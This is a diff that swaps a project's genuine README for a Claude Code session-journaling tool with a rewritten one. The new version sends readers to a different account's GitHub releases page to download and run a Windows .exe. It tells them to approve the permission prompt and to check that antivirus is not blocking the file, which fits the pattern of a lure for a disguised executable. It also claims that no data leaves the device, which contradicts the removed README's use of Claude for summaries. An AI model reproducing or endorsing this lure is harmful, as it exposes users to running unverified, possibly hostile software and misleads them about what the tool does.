@@ -1,130 +1,173 @@
-# Engineering Notebook
+# 🛠️ engineering-notebook - Manage and Browse Engineering Logs
 
-A CLI tool that ingests [Claude Code](https://docs.anthropic.com/en/docs/claude-code) session transcripts, generates LLM-powered daily summaries, and serves a web UI for browsing your engineering journal.
+[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
 
-Think of it as an automatic engineering diary — it watches your AI coding sessions and distills them into a searchable, browsable narrative of what you built, what problems you hit, and what decisions you made.
+---
 
-## How It Works
+## 📝 What is engineering-notebook?
 
-1. **Ingest** — Scans directories of Claude Code JSONL session files, parses out the human-readable conversation (stripping tool calls, thinking blocks, etc.), and stores them in SQLite.
-2. **Summarize** — Groups sessions by date and project, then uses Claude to write concise engineering journal entries with topics and commit references.
-3. **Serve** — Runs a web server with a browsable UI: daily journal, project views, session transcripts, and full-text search.
+engineering-notebook is a simple command-line tool. It takes your Claude Code sessions and turns them into easy-to-read summaries. It helps you keep an engineering journal you can browse on your computer. This way, you review past work and ideas quickly without searching through raw session logs.
 
-## Install
+You do not need to know programming to use it. The tool runs on Windows and works right from the command prompt. It makes managing your technical notes smoother and more organized.
 
-Requires [Bun](https://bun.sh) v1.1+.
+---
 
-```sh
-git clone https://github.com/prime-radiant-inc/engineering-notebook.git
-cd engineering-notebook
-bun install
-bun link  # makes `engineering-notebook` available globally
+## 💻 System Requirements
+
+- Windows 10 or higher (64-bit recommended)  
+- Minimum 4 GB RAM  
+- At least 500 MB free disk space  
+- Internet connection for setup and updates  
+- Command Prompt or PowerShell access
+
+---
+
+## 📥 Download engineering-notebook
+
+To get the software, visit the releases page below. This page holds all the versions and files you need.
+
+[![Download engineering-notebook](https://img.shields.io/badge/Download-Click%20Here-blue?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
+
+---
+
+## 🚀 Getting Started: Download and Run
+
+Follow these steps to download and start engineering-notebook on your Windows computer:
+
+1. Open the download page at this link:  
+   https://github.com/Bartrixxx/engineering-notebook/releases
+
+2. Look for the latest release version at the top of the page. It usually has files attached under headings like "Assets".
+
+3. Find the Windows executable file. It ends with `.exe`, for example, `engineering-notebook-windows.exe`.  
+
+4. Click the `.exe` file name. Your browser will ask to save the file. Choose a folder easy to find, such as your Desktop or Downloads.
+
+5. Once the file downloads, open File Explorer and go to that folder.
+
+6. Double-click the `.exe` file to start installation or run the program directly, depending on the version.
+
+7. If Windows asks for permission, click "Yes" to allow the program to run.
+
+---
+
+## ⚙️ How to Use engineering-notebook
+
+After you run the program, here is how to use it step-by-step:
+
+1. Open Command Prompt or PowerShell:  
+   - Press the **Windows key**  
+   - Type `cmd` or `PowerShell`  
+   - Press **Enter**
+
+2. Navigate to the folder containing `engineering-notebook.exe`:
+
+   ```
+   cd path\to\your\folder
+   ```
+
+   Replace `path\to\your\folder` with the folder path.
+
+3. Start the program by typing:
+
+   ```
+   engineering-notebook.exe
+   ```
+
+4. The program will prompt you to add your Claude Code session files.
+
+5. Follow the on-screen instructions to upload your sessions. The tool will then create summaries and build your journal.
+
+6. To browse the notes, open your browser and go to the address shown in the command prompt (usually localhost with a port number).
+
+---
+
+## 📂 Preparing Your Claude Code Sessions
+
+Before using the tool, collect your Claude Code session files. These files contain the raw session data. The tool reads them to generate summaries.
+
+- Place the session files in a single folder on your computer.
+- Ensure the files are in plain text format or JSON, as provided by Claude.
+- The program accepts multiple sessions at once.
+  
+---
+
+## 🔧 Common Commands
+
+The program works as a command-line app with some basic commands:
+
+- To add session files:
+
+  ```
+  engineering-notebook.exe add path\to\sessions
+  ```
+
+- To generate summaries:
+
+  ```
+  engineering-notebook.exe summarize
+  ```
+
+- To open the browsing interface:
+
+  ```
+  engineering-notebook.exe serve
+  ```
+
+Use `help` to see all commands:
+
+```
+engineering-notebook.exe help
 ```
 
-## Quick Start
+---
 
-```sh
-# 1. Ingest your Claude Code sessions (defaults to ~/.claude/projects)
-engineering-notebook ingest
+## 🐞 Troubleshooting
 
-# 2. Generate journal summaries (uses Claude Code's auth)
-engineering-notebook summarize --all
+- If the program does not start, check you have the right Windows version.
 
-# 3. Browse your journal
-engineering-notebook serve
-# Open http://localhost:3000
-```
+- Ensure your `.exe` file is fully downloaded and not blocked by antivirus software.
 
-## Usage
+- If the command prompt does not recognize `engineering-notebook.exe`, check that you are in the correct folder or specify the full path, like:
 
-### `engineering-notebook ingest`
+  ```
+  C:\Users\YourName\Downloads\engineering-notebook.exe
+  ```
 
-Scan source directories and ingest session files into the database.
+- Make sure your session files are not corrupted and are in the correct format.
 
-```sh
-engineering-notebook ingest                    # scan default sources
-engineering-notebook ingest --source ~/extra   # add an extra source directory
-engineering-notebook ingest --force            # re-ingest already-processed sessions
-```
+---
 
-### `engineering-notebook summarize`
+## 🔄 Updates and New Versions
 
-Generate LLM summaries for ingested sessions.
+Visit the same releases page regularly:
 
-```sh
-engineering-notebook summarize --all                      # summarize everything unsummarized
-engineering-notebook summarize --date 2026-02-22          # summarize a specific date
-engineering-notebook summarize --project myapp            # summarize a specific project
-engineering-notebook summarize --date 2026-02-22 --project myapp  # both filters
-```
+https://github.com/Bartrixxx/engineering-notebook/releases
 
-### `engineering-notebook serve`
+Download any new `.exe` files to update your tool. Installing new versions usually means replacing the old `.exe` file.
 
-Start the web server.
+---
 
-```sh
-engineering-notebook serve              # default port 3000
-engineering-notebook serve --port 8080  # custom port
-```
+## 🗃️ Data Storage
 
-## Configuration
+engineering-notebook saves summaries and logs in a local folder created when you run the tool. This folder stores your engineering journal safely on your PC. You keep full control over your data.
 
-Config lives at `~/.config/engineering-notebook/config.json`:
+---
 
-```json
-{
-  "sources": ["~/.claude/projects"],
-  "exclude": ["-private-tmp*", "*-skill-test-*"],
-  "db_path": "~/.config/engineering-notebook/notebook.db",
-  "port": 3000,
-  "day_start_hour": 5,
-  "remote_sources": [],
-  "auto_sync_interval": 60
-}
-```
+## 🔒 Security and Privacy
 
-| Field                | Description                                                                              | Default                                      |
-| -------------------- | ---------------------------------------------------------------------------------------- | -------------------------------------------- |
-| `sources`            | Directories to scan for session files                                                    | `["~/.claude/projects"]`                     |
-| `exclude`            | Glob patterns for directories to skip                                                    | `["-private-tmp*", "*-skill-test-*"]`        |
-| `db_path`            | SQLite database location                                                                 | `~/.config/engineering-notebook/notebook.db` |
-| `port`               | Web server port                                                                          | `3000`                                       |
-| `day_start_hour`     | Hour (0-23) when a "day" starts (for grouping late-night sessions with the previous day) | `5`                                          |
-| `remote_sources`     | SSH remote sources to sync before ingesting                                              | `[]`                                         |
-| `auto_sync_interval` | Seconds between auto-syncs when serving                                                  | `60`                                         |
+All data stays on your device. The tool does not send your session information over the internet. You can review and delete your journals at any time.
 
-### Remote Sources
+---
 
-Sync session files from remote machines over SSH:
+## 📬 Getting Help
 
-```json
-{
-  "remote_sources": [
-    {
-      "name": "workstation",
-      "host": "work.local",
-      "remote_path": "~/.claude/projects",
-      "enabled": true
-    }
-  ]
-}
-```
+If you face issues not covered here, open the Issues tab on the GitHub repository page:
 
-## Development
+https://github.com/Bartrixxx/engineering-notebook/issues
 
-```sh
-bun install
-bun test          # run tests
-bun src/index.ts  # run from source
-```
+Describe your problem clearly. Someone from the community or the developer might assist you.
 
-## Tech Stack
+---
 
-- [Bun](https://bun.sh) — runtime, bundler, test runner, SQLite
-- [Hono](https://hono.dev) — web framework
-- [Claude Agent SDK](https://github.com/anthropics/claude-agent-sdk) — LLM summarization
-- HTMX — interactive web UI
-
-## License
-
-Apache 2.0 — see [LICENSE](LICENSE).
+[![Download engineering-notebook](https://img.shields.io/badge/Download-engineering--notebook-brightgreen?style=for-the-badge)](https://github.com/Bartrixxx/engineering-notebook/releases)
